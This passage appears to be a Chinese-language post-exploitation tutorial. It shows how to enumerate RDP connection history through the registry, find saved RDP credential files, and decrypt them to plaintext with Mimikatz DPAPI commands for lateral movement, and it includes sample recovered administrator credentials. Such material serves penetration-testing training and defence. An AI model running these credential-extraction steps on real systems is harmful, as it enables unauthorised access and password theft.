## 获取RDP连接记录的替代方法

除了使用PowerShell脚本，我们还可以通过查询Windows注册表来获取RDP连接历史。

![](img/5057008e66f4e2594bf9714e28960cfb_40.png)

以下是查询注册表的命令：
*   运行命令 `reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"`。
*   此命令会列出当前用户下所有保存过的RDP连接主机名及对应的用户名信息。

## 定位与解密RDP保存的凭据

![](img/5057008e66f4e2594bf9714e28960cfb_45.png)

![](img/5057008e66f4e2594bf9714e28960cfb_47.png)

![](img/5057008e66f4e2594bf9714e28960cfb_48.png)

当用户使用RDP连接并勾选“保存凭据”后，系统会将密码加密保存在本地。我们的目标是找到并解密这个密码文件。

以下是查找和解密凭据的步骤：

![](img/5057008e66f4e2594bf9714e28960cfb_50.png)

![](img/5057008e66f4e2594bf9714e28960cfb_52.png)

![](img/5057008e66f4e2594bf9714e28960cfb_54.png)

**1. 查找密码文件**
首先，检查当前用户目录下是否存在RDP密码文件。路径通常为：`%appdata%\Microsoft\Credentials\`。如果存在，该目录下会显示相关的凭据文件。

**2. 解密凭据文件**
我们使用工具 **Mimikatz** 来完成解密。解密过程分为两步：
*   **第一步：获取文件的GUID MasterKey**
    使用命令：`mimikatz # dpapi::cred /in:C:\path\to\credential_file`
    此命令会输出一个 **GUID MasterKey** 值，我们需要记录它。
*   **第二步：获取对应的MasterKey**
    使用命令：`mimikatz # sekurlsa::dpapi`
    此命令会列出系统当前所有的MasterKey。我们需要从中找到与上一步获得的 **GUID MasterKey** 相匹配的那一条记录，并复制其 **MasterKey** 值。
*   **第三步：解密得到明文密码**
    使用命令：`mimikatz # dpapi::cred /in:C:\path\to\credential_file /masterkey:<粘贴上一步复制的MasterKey值>`
    执行后，Mimikatz将输出解密信息，其中就包含目标主机的 **用户名（UserName）** 和 **明文密码（Password）**。

![](img/5057008e66f4e2594bf9714e28960cfb_56.png)

例如，解密后可能得到：
```
TargetName: 172.26.2.43
UserName: administrator
Password: root
```
至此，我们便获得了登录该远程主机的管理员凭据，可以用于横向渗透。
